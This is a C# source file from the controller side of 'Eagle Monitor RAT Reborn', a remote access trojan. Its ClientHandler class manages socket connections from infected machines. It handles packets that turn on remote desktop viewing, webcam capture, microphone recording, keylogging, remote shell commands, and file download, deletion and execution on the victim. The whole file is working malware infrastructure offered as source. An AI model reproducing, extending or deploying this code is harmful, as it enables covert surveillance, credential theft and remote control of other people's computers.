using Eagle_Monitor_RAT_Reborn.Misc;
using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class ClientHandler : IDisposable
    {
        static ClientHandler()
        {
            ClientHandlersList = new Dictionary<string, ClientHandler>();
            readDataAsync = new ReadDataAsync(ReceiveData);
            parsePacketAsync = new ParsePacketAsync(ParsePacket);
            sendDataAsync = new SendDataAsync(SendData);
        }

        internal static Dictionary<string, ClientHandler> ClientHandlersList { get; set; }
        internal static int CurrentClientsNumber { get { return ClientHandlersList.Count; } }

        private static readonly ReadDataAsync readDataAsync;
        private static readonly ParsePacketAsync parsePacketAsync;
        private static readonly SendDataAsync sendDataAsync;

        private delegate byte[] ReadDataAsync(ClientHandler clientHandler);
        private delegate IPacket ParsePacketAsync(byte[] BufferPacket);
        private delegate IPacket SendDataAsync(ClientHandler clientHandler, IPacket data);

        internal static void SendPacketToMultipleClients(IPacket packet)
        {
            foreach (DataGridViewRow dataGridViewRow in Program.mainForm.clientDataGridView.SelectedRows)
            {
                StartSendData(ClientHandler.ClientHandlersList[dataGridViewRow.Cells[2].Value.ToString()], packet);
            }
        }

        #region "Non Static"
        internal Socket Socket { get; set; }
        internal string IP { get; set; }
        internal string HWID { get; set; }
        internal string FullName { get; set; }
        internal DataGridViewRow ClientRow { get; set; }
        internal int ServerPort { get; set; }
        internal string ClientPath { get; set; }
        internal string ClientStatus { get; set; }
        internal bool Is64bitClient { get; set; }
        internal bool IsAdmin { get; set; }
        internal EncryptionInformation EncryptionInformation { get; set; }

        internal ClientForm ClientForm { get; set; }
        internal long TotalBytesReceived { get; set; }
        internal long TotalBytesSent { get; set; }

        internal ClientHandler(Socket sock, int port) : base()
        {
            this.Socket = sock;
            this.IP = Socket.RemoteEndPoint.ToString();
            this.ServerPort = port;
            StartReceiveData(this);
        }
        #endregion
        #region "Receive"
        private static void StartReceiveData(ClientHandler clientHandler)
        {
            if (clientHandler.Socket != null)
                readDataAsync.BeginInvoke(clientHandler, new AsyncCallback(EndReceiveData), clientHandler);
            else
                return;
        }

        private static byte[] ReceiveData(ClientHandler clientHandler)
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                clientHandler.Socket.Poll(-1, SelectMode.SelectRead);
                recv = clientHandler.Socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = clientHandler.Socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }
                return data;
            }
            catch (Exception ex)
            {
                if (ex is SocketException)
                    clientHandler.Dispose();
                return null;
                /*SocketException sockError = ex as SocketException;
                if (sockError != null)
                    clientHandler.Dispose();
                return null;*/
            }
        }
        private static void EndReceiveData(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;

            if (data != null && data.Length > 0)
                StartParsePacket(data, clientHandler);

            if (clientHandler.Socket != null)
                StartReceiveData(clientHandler);
        }
        #endregion
        #region "Parser"
        private static void StartParsePacket(byte[] data, ClientHandler clientHandler) 
        {
            parsePacketAsync.BeginInvoke(data, new AsyncCallback(EndParsePacket), clientHandler);
        }

        private static IPacket ParsePacket(byte[] BufferPacket)
        {
            IPacket packet = BufferPacket.DeserializePacket(Program.settings.key);
            packet.PacketSize = BufferPacket.Length;
            return packet;
        }

        private static void EndParsePacket(IAsyncResult ar)
        {
            IPacket packet = parsePacketAsync.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            /* if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)//!!! if password recovery tasks and similar
             {*/
            if (packet != null)
            {
                switch (packet.PacketType)
                {
                    case PacketType.CONNECTED:
                        lock (ClientHandlersList)
                        {
                            ClientHandlersList.Add(clientHandler.IP, clientHandler);
                            Controls.Utils.SetTotalClients();
                        }
                        //new PacketHandler(packet, this);
                        PacketHandler.StartHandlePacket(packet, clientHandler);
                        break;

                    case PacketType.RM_VIEW_ON:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)//we could even receive packet after closing form
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteDesktopHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteDesktopHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    case PacketType.RC_CAPTURE_ON:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteWebCamHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteWebCamHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    case PacketType.AUDIO_RECORD_ON:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteMicrophoneHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteMicrophoneHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    case PacketType.KEYLOG_ON:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.KeyloggerHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.KeyloggerHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        //new PacketHandler(packet, this);
                        break;

                    case PacketType.FM_DOWNLOAD_FILE:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        // new PacketHandler(packet, this);
                        break;

                    case PacketType.CHAT_ON:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.ChatHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.ChatHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    case PacketType.SHELL_START:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    case PacketType.SHELL_COMMAND:
                        if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null)
                        {
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler.ClientHandler = clientHandler;
                            ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler.ClientHandler.HWID = packet.HWID;
                            PacketHandler.StartHandlePacket(packet, clientHandler);
                        }
                        break;

                    default:
                        PacketHandler.StartHandlePacket(packet, ClientHandler.ClientHandlersList[packet.BaseIp]);
                        clientHandler.Dispose();
                        break;
                }
            }
        }
        #endregion
        #region "Send"
        internal static void StartSendData(ClientHandler clientHandler, IPacket packet)
        {
            packet.HWID = clientHandler.HWID;
            if(    packet.PacketType != PacketType.RM_VIEW_OFF
                && packet.PacketType != PacketType.RM_VIEW_ON
                && packet.PacketType != PacketType.RM_MOUSE
                && packet.PacketType != PacketType.RM_KEYBOARD
                && packet.PacketType != PacketType.RC_CAPTURE_OFF
                && packet.PacketType != PacketType.RC_CAPTURE_ON
                && packet.PacketType != PacketType.AUDIO_RECORD_OFF
                && packet.PacketType != PacketType.AUDIO_RECORD_ON
                && packet.PacketType != PacketType.KEYLOG_OFF
                && packet.PacketType != PacketType.KEYLOG_ON
                && packet.PacketType != PacketType.CHAT_OFF
                && packet.PacketType != PacketType.CHAT_ON
                && packet.PacketType != PacketType.SHELL_STOP 
                && packet.PacketType != PacketType.SHELL_COMMAND
                )
                packet.BaseIp = clientHandler.IP;

            if (clientHandler.Socket != null)
                sendDataAsync.BeginInvoke(clientHandler, packet, new AsyncCallback(EndSendData), clientHandler);
        }

        private static IPacket SendData(ClientHandler clientHandler, IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(Program.settings.key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);
            data.PacketSize = size;

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.PacketType;

            lock (clientHandler.Socket)
            {
                try
                {
                    clientHandler.Socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = clientHandler.Socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                clientHandler.Socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = clientHandler.Socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    data.PacketState = PacketState.SENT;
                }
                catch (Exception ex)
                {
                    data.PacketState = PacketState.NOT_SENT;
                    data.Status = ex.Message;
                    if (ex is SocketException)
                        clientHandler.Dispose();
                    /* data.packetState = PacketState.NOT_SENT;
                     data.status = ex.Message;
                     SocketException sockError = ex as SocketException;
                     if (sockError != null)
                         clientHandler.Dispose();*/
                }
            }
            return data;
        }
        private static void EndSendData(IAsyncResult ar)
        {
            IPacket packet = sendDataAsync.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            IAsyncResult result;

            packet.DatePacketStatus = DateTime.Now.ToString();

            string size = Misc.Utils.Numeric2Bytes(packet.PacketSize);

            switch (packet.PacketType) 
            {
                case PacketType.RM_VIEW_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteDesktopHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteDesktopHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteDesktopHandler = null;
                    }
                    break;

                case PacketType.RC_CAPTURE_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteWebCamHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteWebCamHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteWebCamHandler = null;
                    }
                    break;

                case PacketType.AUDIO_RECORD_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteMicrophoneHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteMicrophoneHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteMicrophoneHandler = null;
                    }
                    break;

                case PacketType.KEYLOG_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.KeyloggerHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.KeyloggerHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.KeyloggerHandler = null;
                    }
                    break;

                case PacketType.CHAT_OFF:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.ChatHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.ChatHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.ChatHandler = null;
                    }
                    break;

                case PacketType.SHELL_STOP:
                    lock (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler)
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler.Dispose();
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.RemoteShellHandler = null;
                    }
                    break;
            }

            if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null
                && packet.PacketType != PacketType.CLOSE_CLIENT
                && packet.PacketType != PacketType.UNINSTALL_CLOSE_CLIENT)
            {

                try//Label deleted when closin form
                {
                    ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesSentlabel.Invoke((Action)(() =>
                    {
                        ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesSentlabel.Text = $"Bytes sent : {size}";
                    }));
                }
                catch {}
            }

            #region "Logs"
            result = Program.mainForm.logsDataGridView.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = Program.mainForm.logsDataGridView.Rows.Add();
                DataGridViewRow row = Program.mainForm.logsDataGridView.Rows[rowId];
                row.Cells["Column11"].Value = packet.HWID;
                row.Cells["Column12"].Value = packet.BaseIp;
                row.Cells["Column13"].Value = packet.PacketType.ToString();
                row.Cells["Column14"].Style.ForeColor = Color.FromArgb(66, 182, 245);
                row.Cells["Column14"].Value = packet.PacketState;
                row.Cells["Column15"].Value = packet.DatePacketStatus;
                row.Cells["Column17"].Value = size;

                if (packet.PacketState == PacketState.NOT_SENT)
                {
                    row.Cells["Column16"].Value = packet.Status;
                    return;
                }
                else
                {
                    switch (packet.PacketType)
                    {
                        case PacketType.FM_DOWNLOAD_FILE:
                            row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
                            break;

                        case PacketType.FM_DELETE_FILE:
                            row.Cells["Column16"].Value = ((DeleteFilePacket)packet).path;
                            break;

                        case PacketType.FM_START_FILE:
                            row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
                            break;

                        case PacketType.FM_GET_FILES_AND_DIRS:
                            row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
                            break;

                        case PacketType.SHELL_COMMAND:
                            row.Cells["Column16"].Value = ((NewCommandShellSessionPacket)packet).shellCommand;
                            break;
                    }
                }
                Program.mainForm.logsDataGridView.ClearSelection();
                Program.mainForm.logsDataGridView.CurrentCell = null;

            }));
            Program.mainForm.logsDataGridView.EndInvoke(result);
            #endregion  
            packet = null;
        }
        #endregion
        #region "Cleaning Memory"
        public void Dispose()
        {
            Socket?.Shutdown(SocketShutdown.Both);
            Socket?.Close();
            Socket?.Dispose();
            Socket = null;

            if (ClientHandlersList.ContainsKey(this.IP))
                ClientHandlersList.Remove(this.IP);

            Controls.Utils.SetTotalClients();

            if (this.ClientRow != null)
            {
                lock (Program.mainForm.clientDataGridView)
                {
                    Program.mainForm.clientDataGridView.Invoke((MethodInvoker)(() =>
                    {
                        Program.mainForm.clientDataGridView.Rows.Remove(this.ClientRow);
                    }));
                }
                Controls.Utils.CloseForm(this.ClientForm);
                this.ClientForm?.Dispose();
                this.ClientForm = null;
                GC.SuppressFinalize(this);
            }
            Miscellaneous.CleanMemory();
        }
        #endregion
    }
}
